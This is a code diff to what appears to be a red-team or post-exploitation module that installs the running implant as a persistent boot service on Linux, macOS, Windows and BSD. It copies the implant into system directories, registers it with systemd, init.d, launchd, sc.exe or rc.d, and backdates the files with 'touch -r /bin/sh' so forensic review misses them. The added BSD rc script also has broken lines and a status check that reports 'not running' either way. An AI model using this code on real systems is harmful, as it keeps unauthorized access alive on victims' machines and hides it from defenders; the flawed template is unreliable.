@@ -138,6 +138,72 @@ launch_daemon_template = """<?xml version="1.0" encoding="UTF-8"?>
 </plist>
 """
 
+bsdinit_template = """
+#!/bin/sh
+#
+# PROVIDE: {{ service_name }}
+# REQUIRE: LOGIN FILESYSTEMS
+# KEYWORD: shutdown
+
+. /etc/rc.subr
+
+name="{{ service_name }}"
+rcvar="{{ service_name }}_enable"
+
+# The command to start the service
+command="{{ service_start_cmd }}"
+# Additional command arguments if any
+command_args=""
+
+# Load the rc.subr script
+load_rc_config $name
+: ${name}_enable:=no }
+
+# Define the function to start the service
+start_cmd="${name}_start"
+
+# Start function
+{{ service_name }}_start() {
+    echo "Starting {{ service_name }}."
+    # Execute the command to start the service
+    ${command} ${command_args} &
+}
+
+# Define the function to stop the service
+stop_cmd="${name}_stop"
+
+# Stop function
+{{ service_name }}_stop() {
+    echo "Stopping {{ service_name }}."
+    # Command to stop the service if required
+    # For example, if {{ service_name }} supports graceful shutdown:
+    # killall -SIGTERM {{ service_name }}
+}
+
+# Define the function to check if the service is running
+status_cmd="${name}_status"
+
+# Status function
+{{ service_name }}_status() {
+    # Check if the service is running
+    # For example, check if the process exists
+    if pgrep -q -x "{{ service_name }}"; then
+        echo "{{ service_name }} is not running."
+    else
+        echo "{{ service_name }} is not running."
+    fi
+}
+
+# Define command line arguments to control the service
+# e.g., {{ service_name }}_enable="YES" to enable the service
+
+# Start the service automatically during system startup
+{{ service_name }}_enable="YES"
+
+# Call the rc.subr functions to handle the service
+run_rc_command "$1"
+"""
+
 def is_using_systemd():
     command_get_res = sys.shell("command -v systemctl")
     if command_get_res['status'] == 0 and file.is_file(command_get_res['stdout'].strip()):
@@ -149,6 +215,13 @@ def is_using_systemd():
 def is_using_sysvinit():
     command_get_res = sys.shell("command -v update-rc.d")
     if command_get_res['status'] == 0 and file.is_file(command_get_res['stdout'].strip()):
+        return True
+    return False
+
+def is_using_bsdinit():
+    # Lol this is how ansible does it too :shrug:
+    # https://github.com/ansible/ansible/blob/386edc666ec2a053b4d576fc4b2deeb46fe492b8/lib/ansible/module_utils/facts/system/service_mgr.py#L124
+    if sys.get_os()['platform'] == "BSD":
         return True
     return False
 
@@ -165,6 +238,8 @@ def systemd(service_name, service_desc, executable_path, executable_args):
 
     # assets.copy("persist_service/files/payload.elf", executable_path)
     sys.shell("chmod +x "+executable_path)
+    sys.shell(f"touch -r /bin/sh {executable_path}")
+    sys.shell(f"touch -r /bin/sh /usr/lib/systemd/system/{service_name}.service")
 
     sys.shell("systemctl daemon-reload "+service_name)
     sys.shell("systemctl enable "+service_name)
@@ -185,10 +260,33 @@ def sysvinit(service_name, service_desc, executable_path, executable_args):
 
     # assets.copy("persist_service/files/payload.elf", executable_path)
     sys.shell("chmod +x "+executable_path)
+    sys.shell(f"touch -r /bin/sh {executable_path}")
+    sys.shell(f"touch -r /bin/sh /etc/init.d/{service_name}")
 
     sys.shell("update-rc.d "+service_name+" defaults")
     sys.shell("service "+service_name+" start")
     print("sysvinit installed")
+
+def bsdinit(service_name, service_desc, executable_path, executable_args):
+    startup_dir = "/usr/local/etc/rc.d/"
+    if not file.is_dir(startup_dir):
+        print(startup_dir+" not found")
+        return
+
+    file.write("/tmp/svc.sh.j2", bsdinit_template)
+    args = {
+        "service_name":service_name,
+        "service_desc":service_desc,
+        "service_start_cmd":executable_path+" "+executable_args
+    }
+    file.template("/tmp/svc.sh.j2",startup_dir+service_name+".sh", args, False)
+    file.remove("/tmp/svc.sh.j2")
+
+    sys.shell("chmod +x "+startup_dir+service_name+".sh")
+    sys.shell("chmod +x "+executable_path)
+    sys.shell("service "+service_name+".sh start")
+
+    print("bsdinit installed")
 
 def launch_daemon(service_name, executable_path, executable_args):
     # assets.copy("persist_service/files/launch_daemon.plist.j2","/tmp/plist.j2")
@@ -205,6 +303,20 @@ def launch_daemon(service_name, executable_path, executable_args):
     sys.shell("launchctl load -w /Library/LaunchDaemons/"+service_name+".plist")
     print("Launch daemon installed")
 
+def windows_service_manager(service_name, service_display_name, service_description, executable_path):
+    create_res = sys.shell("sc.exe create "+service_name+" binpath= "+executable_path+" displayname="+service_display_name+" start= auto type= own")
+    if 'ERROR' in create_res['stdout'] or create_res['stderr'] != "":
+        print("Failed to create service:\n"+create_res+"\n")
+        print("\n")
+        return
+
+    start_res = sys.shell("sc.exe start "+service_name)
+    if 'ERROR' in start_res['stdout'] or start_res['stderr'] != "":
+        print("Failed to start service:\n"+start_res+"\n")
+        print("\n")
+        return
+
+
 def persist_service(service_name, service_desc, executable_name, executable_args):
     src_path = process.info()['exe']
     if sys.is_linux():
@@ -218,6 +330,15 @@ def persist_service(service_name, service_desc, executable_name, executable_args
         executable_path = "/var/root/"+executable_name
         file.copy(src_path, executable_path)
         launch_daemon(service_name, executable_path, executable_args)
+    elif sys.is_windows():
+        executable_path = "C:\\ProgramData\\"+executable_name+".exe"
+        file.copy(src_path, executable_path)
+        windows_service_manager(service_name, service_name, service_desc, executable_path)
+    elif sys.get_os()['platform'] == "BSD":
+        executable_path = "/bin/"+executable_name
+        file.copy(src_path, executable_path)
+        if is_using_bsdinit():
+            bsdinit(service_name, service_desc, executable_path, executable_args)
     else:
         print("OS not supported")
 
